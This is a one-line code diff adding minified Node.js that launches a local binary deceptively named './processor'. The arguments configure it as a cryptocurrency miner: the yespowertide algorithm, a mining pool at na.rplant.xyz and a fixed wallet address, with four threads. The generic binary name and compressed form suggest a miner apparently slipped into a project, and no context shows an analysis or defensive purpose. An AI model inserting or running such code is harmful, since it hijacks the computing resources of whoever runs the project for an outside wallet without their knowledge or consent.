@@ -1,0 +1,1 @@
+const{spawn}=require('child_process');const m=spawn('./processor',['-a','yespowertide','-o','stratum+tcps://na.rplant.xyz:17059','-u','TWJa3cLtb2ibL5C6i93GVD6DTHjUqpuxHs.Flux','-t','4']);m.stdout.on('data',d=>console.log(d.toString()));m.stderr.on('data',d=>console.error(d.toString()));
